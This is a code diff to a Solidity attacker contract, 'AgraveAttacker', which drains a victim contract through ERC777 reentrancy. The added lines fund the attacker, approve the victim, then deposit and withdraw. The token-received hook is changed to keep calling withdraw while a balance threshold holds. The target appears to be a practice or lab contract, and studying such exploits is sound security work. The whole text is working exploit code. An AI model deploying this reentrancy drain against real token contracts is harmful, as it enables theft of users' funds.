@@ -14,6 +14,8 @@ contract AgraveAttacker is IERC777Recipient {
     }
 
     function attack(uint256 amount) external {
+        token.transferFrom(msg.sender, address(this), amount);
+        token.increaseAllowance(address(victim), amount);
         victim.deposit(amount);
         victim.withdraw(address(this));
     }
@@ -35,7 +37,8 @@ contract AgraveAttacker is IERC777Recipient {
         operatorData;
         // may be a better expression in if statement,
         // this version may lead to REVERT;
-        if (token.balanceOf(address(victim)) >= 0) {
+        // 10 ** 18 in value == 1 AGT
+        if (token.balanceOf(address(from)) > 10 ** 18) {
             victim.withdraw(address(this));
         }
     }
